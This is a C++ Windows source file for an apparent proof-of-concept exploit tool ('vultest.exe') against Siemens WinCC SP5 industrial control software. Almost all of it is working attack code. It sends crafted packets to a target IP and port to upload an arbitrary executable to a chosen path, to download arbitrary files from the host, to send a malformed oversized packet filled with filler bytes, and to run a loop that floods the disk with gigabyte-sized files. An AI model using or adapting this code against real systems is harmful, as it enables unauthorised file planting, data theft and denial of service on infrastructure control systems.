
#include <string>
#include <iostream>

#include <winsock.h>
#include <Windows.h>

using namespace std;

#pragma comment(lib,"ws2_32.lib")


#pragma pack()

typedef struct {

	int v18[521];		// [esp+24h] [ebp-1234h] BYREF
	wchar_t v19[1024];	// [esp+848h] [ebp-A10h] BYREF
	int v20;			// [esp+1048h] [ebp-210h]
}WINCC_SP5_FILE_PARAM;


typedef struct {

	int size;
	unsigned short data[1024];
}WINCC_SP5_19234_PARAM;

#pragma pack()




int upload(string strip, int port, string path) {

	int ret = 0;

	SOCKET s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	if (s == INVALID_SOCKET) {
		perror("socket error\r\n");
		return -1;
	}
	sockaddr_in sa = { 0 };
	sa.sin_family = AF_INET;
	sa.sin_addr.S_un.S_addr = inet_addr(strip.c_str());
	sa.sin_port = ntohs(port);

	int bufsize = 0x1000000;

	char* buf = new char[bufsize];
	memset(buf, 0x41, bufsize); 

	int size = sizeof(WINCC_SP5_FILE_PARAM);

	WINCC_SP5_FILE_PARAM* lpparam = (WINCC_SP5_FILE_PARAM*)buf;
	lpparam->v20 = 1;

	wchar_t wstrPath[0x1000];
	int wstrLen = MultiByteToWideChar(CP_ACP, 0, path.c_str(), -1, wstrPath, sizeof(wstrPath) / 2);
	wstrPath[wstrLen] = 0;

	wcscpy((wchar_t*)(lpparam->v19), wstrPath);

	wcscpy((wchar_t*)(lpparam->v18), wstrPath);

	int sendsize = (size);

	ret = connect(s, (sockaddr*)&sa, sizeof(sockaddr_in));
	if (ret) {
		perror("connect error\r\n");
		return -1;
	}

	ret = send(s, buf, sendsize, 0);
	if (ret > 0) {
		cout << "send size:" << ret << endl;
	}
	else {
		cout << "send error:" << ret << endl;
		return -1;
	}

	ret = recv(s, buf, bufsize, 0);
	if (ret > 0) {
		cout << "recv size:" << ret << endl;
	}
	else {
		cout << "recv error:" << ret << endl;
		return -1;
	}

	__int64 fs = 0;
	HANDLE hf = CreateFileA("test.exe", 0xc0000000, 3, 0, OPEN_EXISTING, 0x80, 0);
	if (hf != INVALID_HANDLE_VALUE) {
		fs = GetFileSize(hf, 0);
		DWORD dwcnt = 0;
		ret = ReadFile(hf, buf, (int)fs, &dwcnt, 0);
		CloseHandle(hf);
		if (ret <= 0) {
			cout << "ReadFile error:" << ret << endl;
			return -1;
		}
	}

	__int64 maxsize = fs;
	ret = send(s, (char*)&maxsize, sizeof(maxsize), 0);
	if (ret > 0) {
		cout << "send size:" << ret << endl;
	}
	else {
		cout << "send error:" << ret << endl;
		return -1;
	}
	__int64 number = (fs << 32) + fs;
	ret = send(s, (char*)&number, sizeof(number), 0);
	if (ret > 0) {
		cout << "send size:" << ret << endl;
	}
	else {
		cout << "send error:" << ret << endl;
		return -1;
	}


	ret = send(s, (char*)buf, (int)fs, 0);
	if (ret > 0) {
		cout << "send size:" << ret << endl;
	}
	else {
		cout << "send error:" << ret << endl;
		return -1;
	}

	ret = recv(s, buf, bufsize, 0);
	if (ret > 0) {
		cout << "recv size:" << ret << endl;
	}
	else {
		cout << "recv error:" << ret << endl;
		return -1;
	}
	delete[]buf;
	closesocket(s);

	return 0;
}




int download(string strip, int port, string path) {

	int ret = 0;

	SOCKET s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	if (s == INVALID_SOCKET) {
		perror("socket error\r\n");
		return -1;
	}
	sockaddr_in sa = { 0 };
	sa.sin_family = AF_INET;
	sa.sin_addr.S_un.S_addr = inet_addr(strip.c_str());
	sa.sin_port = ntohs(port);

	wchar_t wstrPath[0x1000];
	int wstrLen = MultiByteToWideChar(CP_ACP, 0, path.c_str(), -1, wstrPath, sizeof(wstrPath) / 2);
	wstrPath[wstrLen] = 0;

	int bufsize = 0x4000000;
	char* buf = new char[bufsize];
	//memset(buf, 0x41, bufsize);
	WINCC_SP5_FILE_PARAM* lpparam = (WINCC_SP5_FILE_PARAM*)buf;
	lpparam->v20 = 0;
	wcscpy((wchar_t*)(lpparam->v19), wstrPath);
	wcscpy((wchar_t*)(lpparam->v18), wstrPath);

	int sendsize = sizeof(WINCC_SP5_FILE_PARAM);

	ret = connect(s, (sockaddr*)&sa, sizeof(sockaddr_in));
	if (ret) {
		perror("connect error\r\n");
		return -1;
	}

	ret = send(s, buf, sendsize, 0);
	if (ret > 0) {
		printf("send size:%d\r\n", ret);

	}
	else {
		ret = GetLastError();
		cout << "send error:" << ret << endl;
		return -1;
	}

	ret = recv(s, buf, 4, 0);
	if (ret > 0) {
		printf("recv size:%d\r\n", ret);
	}
	else {
		ret = GetLastError();
		cout << "recv error:" << ret << endl;
		return -1;
	}

	HANDLE hf = CreateFileA("download.txt", 0xc0000000, 3, 0, CREATE_ALWAYS, 0x80, 0);
	if (hf == INVALID_HANDLE_VALUE) {
		ret = GetLastError();
		cout << "CreateFileA error:" << ret << endl;
		return -1;
	}

	char showinfo[1024];

	__int64 maxsize = 0;
	ret = recv(s, (char*)&maxsize, sizeof(maxsize), 0);
	if (ret > 0) {
		wsprintfA(showinfo,"file size:%I64d\r\n", maxsize);
		cout << showinfo << endl;
	}
	else {
		ret = GetLastError();
		cout << "recv maxsize error:" << ret << endl;
		return -1;
	}
	
	__int64 total = 0;
	while (total < maxsize) {
		__int64 subsize = 0;
		ret = recv(s, (char*)&subsize, sizeof(subsize), 0);
		if (ret > 0) {
			DWORD low = (subsize & 0xffffffff);
			DWORD high = ( subsize >> 32) & 0xffffffff;
			wsprintfA(showinfo,"sub size low:%d,sub size high:%d\r\n", low,high);
			cout << showinfo << endl;
		}
		else {
			cout << "recv sub error:" << GetLastError() << endl;
			return -1;
		}

		

		DWORD low = (subsize & 0xffffffff);
		total += low;

		DWORD blocksize = 0;
		while (blocksize < low) {
			int retsize = recv(s, (char*)buf + blocksize, (int)low - blocksize, 0);
			if (retsize > 0) {
				printf ("recv block size:%d\r\n", retsize );

				blocksize += retsize;

				DWORD dwcnt = 0;
				ret = WriteFile(hf, buf, retsize, &dwcnt, 0);
			}
			else {
				cout << "recv block error:" << GetLastError() << endl;
				break;
			}	
		}	
	}

	CloseHandle(hf);

	delete[]buf;

	closesocket(s);

	return 0;
}


int toggle(string strip, int port) {

	int ret = 0;
	sockaddr_in sa = { 0 };

	SOCKET s = 0;

	s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	if (s == INVALID_SOCKET) {
		perror("socket error\r\n");
		return -1;
	}

	sa.sin_family = AF_INET;
	sa.sin_addr.S_un.S_addr = inet_addr(strip.c_str());
	sa.sin_port = ntohs(port);

	int bufsize = 0x100000;

	char* buf = new char[bufsize];

	memset(buf, 0, bufsize);

	WORD* lpp = (WORD*)buf;
	int size = 0x54;
	lpp[0] = size;
	lpp[1] = size;
	lpp[2] = 0x0c;
	*(DWORD*)(buf + 36) = 1;
	*(DWORD*)(buf + 52) = 1;

	*(DWORD*)(buf + 48) = 1;

	*(DWORD*)(buf + 56) = 2;

	*(DWORD*)(buf + 80) = 1;

	int sendsize = size;

	ret = connect(s, (sockaddr*)&sa, sizeof(sockaddr_in));
	if (ret) {
		perror("connect error\r\n");
		return -1;
	}

	ret = send(s, buf, sendsize, 0);
	if (ret > 0) {
		cout << "send size:" << ret << endl;
	}
	else {
		cout << "send error:" << ret << endl;
		return -1;
	}

	ret = recv(s, buf, bufsize, 0);
	if (ret > 0) {
		cout << "recv size:" << ret << endl;
	}
	else {
		cout << "recv error:" << ret << endl;
		return -1;
	}

	delete [] buf;

	closesocket(s);

	return 0;
}

//#define NETWORK_DIR 1

int mainTest(string strip,int port) {

	int ret = 0;
	
	SOCKET s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	if (s == INVALID_SOCKET) {
		perror("socket error\r\n");
		return -1;
	}
	sockaddr_in sa = { 0 };
	sa.sin_family = AF_INET;
	sa.sin_addr.S_un.S_addr = inet_addr(strip.c_str());
	sa.sin_port = ntohs(port);

	int bufsize = 0x1000000;

	char* buf = new char[bufsize];
	memset(buf, 0x41, bufsize);
	wchar_t* wbuf = (wchar_t*)buf;
	for (int i = 0; i < bufsize / 2; i++) {
		wbuf[i] = 0x42;
	}

	WORD* lpp = (WORD*)buf;
	int size = 0x78f0;
	lpp[0] = size;
	lpp[1] = size;
#ifdef NETWORK_DIR
	lpp[2] = ntohs(0xc);
	*(DWORD*)(buf + 36) = ntohl(1);

	*(DWORD*)(buf + 52) = ntohl(1);

	//*(DWORD*)(buf + 580) = 2;

	*(DWORD*)(buf + 48) = ntohl(0);

	*(DWORD*)(buf + 56) = ntohl(1);
#else
	lpp[2] = (0xc);
	*(DWORD*)(buf + 36) = (1);

	*(DWORD*)(buf + 52) = (1);

	//*(DWORD*)(buf + 580) = 2;

	*(DWORD*)(buf + 48) = (0);

	*(DWORD*)(buf + 56) = (1);
#endif

	//wmemcpy((wchar_t*)(buf + 48 + 32), L"c:\\",3);

	//wmemcpy((wchar_t*)(buf + 2132), L"c:\\", 3);
	//39 + 1 = 40
	*(DWORD*)(buf + 80 +  961*2) = 0;
	*(DWORD*)(buf + 2132 + 961*2) = 0;

	int sendsize = ntohs(size);

	ret = connect(s, (sockaddr*)&sa, sizeof(sockaddr_in));
	if (ret) {
		perror("connect error\r\n");
		return -1;
	}

	ret = send(s, buf, sendsize, 0);
	if (ret > 0) {
		cout << "send size:" << ret << endl;
	}
	else {
		cout << "send error:" << ret << endl;
		return -1;
	}

	ret = recv(s, buf, bufsize, 0);
	if (ret > 0) {
		cout << "recv size:" << ret << endl;
	}
	else {
		cout << "recv error:" << ret << endl;
		return -1;
	}

	delete []buf;

	closesocket(s);
	return 0;
}



char g_filename[1024];

int uploadSize(string strip, int port,unsigned int filesize) {

	int ret = 0;

	if (filesize < 0x1000) {
		printf("uploadAttack size:0x%x error\r\n", filesize);
		return 0;
	}

	SOCKET s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	if (s == INVALID_SOCKET) {
		printf("socket error:%d\r\n", GetLastError());
		return 0;
	}
	sockaddr_in sa = { 0 };
	sa.sin_family = AF_INET;
	sa.sin_addr.S_un.S_addr = inet_addr(strip.c_str());
	sa.sin_port = ntohs(port);

	char* buf = new char[filesize];
	if (buf == 0) {
		printf("new error:%d\r\n", GetLastError());
		closesocket(s);
		return -1;
	}

	SYSTEMTIME st;
	GetLocalTime(&st);

	unsigned int r = rand();

	wchar_t wstrPath[0x1000];
	WINCC_SP5_FILE_PARAM* lpparam = (WINCC_SP5_FILE_PARAM*)buf;
	lpparam->v20 = 1;
	unsigned __int64 tickcnt = GetTickCount64();
	int wstrLen = wsprintfA(g_filename, "c:\\attack_test\\%d_%d_%d-%d_%d_%d-%d-%I64d-%u.dat",
	st.wYear,st.wMonth,st.wDay,st.wHour,st.wMinute,st.wSecond,st.wMilliseconds,	tickcnt,r);
	g_filename[wstrLen] = 0;
	int wlen = MultiByteToWideChar(CP_ACP, 0, g_filename, -1, wstrPath, sizeof(wstrPath)/2);
	wstrPath[wlen] = 0;
	wcscpy((wchar_t*)(lpparam->v19), wstrPath);
	wcscpy((wchar_t*)(lpparam->v18), wstrPath);

	int sendsize = sizeof(WINCC_SP5_FILE_PARAM);

	ret = connect(s, (sockaddr*)&sa, sizeof(sockaddr_in));
	if (ret) {
		printf("connect error:%d\r\n", GetLastError());

		delete[]buf;
		closesocket(s);
		return -1;
	}

	ret = send(s, buf, sendsize, 0);
	if (ret <= 0) {
		printf("send error:%d\r\n", GetLastError());
		delete[]buf;
		closesocket(s);
		return -1;
	}


	ret = recv(s, buf, 4, 0);
	int code = *(int*)buf;
	if (ret <= 0) {
		printf("recv error:%d\r\n", GetLastError());
		delete[]buf;
		closesocket(s);
		return -1;
	}


	__int64 fs = filesize;


	__int64 maxsize = fs;
	ret = send(s, (char*)&maxsize, sizeof(maxsize), 0);
	if (ret <=0) {
		printf("send error:%d\r\n", GetLastError());
		delete[]buf;
		closesocket(s);
		return -1;
	}

	__int64 number = (fs << 32) + fs;
	ret = send(s, (char*)&number, sizeof(number), 0);
	if (ret <= 0) {
		printf("send error:%d\r\n", GetLastError());
		delete[]buf;
		closesocket(s);
		return -1;
	}



	ret = send(s, (char*)buf, (int)fs, 0);
	if (ret <= 0) {
		printf("send error:%d\r\n", GetLastError());
		delete[]buf;
		closesocket(s);
		return -1;
	}


	ret = recv(s, buf, filesize, 0);
	if (ret <=  0) {
		printf("recv error:%d\r\n", GetLastError());
		delete[]buf;
		closesocket(s);
		return -1;
	}

	delete[]buf;
	closesocket(s);

	return filesize;
}


int uploadAttack(string strip, int port) {
	srand((unsigned int)time(0));

	printf("uploadAttack ip:%s port:%d\r\n", strip.c_str(), port);
	unsigned int size = 0x40000000;
	while (1) {
		
		int ret = uploadSize(strip, port, size);
		printf("uploadAttack file:%s,size:0x%x result:%x\r\n", g_filename, size,ret);
		if (ret < 0) 
		{
			size = size / 2;
		}
		else if (ret == 0) 
		{
			break;
		}
		else {
			Sleep(20);
		}
	}
	return 0;
}





int main(int argc,char * * argv)
{
	//mytest();

	char buf[1024];
	//int len = vsprintf(buf, "%S\r\n", (char*)L"hello how are you?");

	WSADATA wsa = { 0 };
	int ret = WSAStartup(0x0202, &wsa);
	if (ret) {
		perror("WSAStartup error\r\n");
		return -1;
	}

	if (argc < 4) {
		cout << "example: vultest.exe 192.168.1.3 8000" << endl;
		return -1;
	}

	int port = atoi(argv[2]);

	int opt = atoi(argv[3]);

	//ret = uploadAttack(argv[1], port);
	//return 0;

	if(opt == 1)
		ret = toggle(argv[1], port);
	else if(opt == 2)
		ret = mainTest(argv[1], port);
	else if (opt == 3 && argc >= 5)
	{
		ret = upload(argv[1], port, argv[4]);
	}
	else if (opt == 4 && argc >= 5) {
		ret = download(argv[1], port, argv[4]);
	}
	else if (opt == 5) {
		ret = uploadAttack(argv[1],port);
	}
	
	return 0;
}


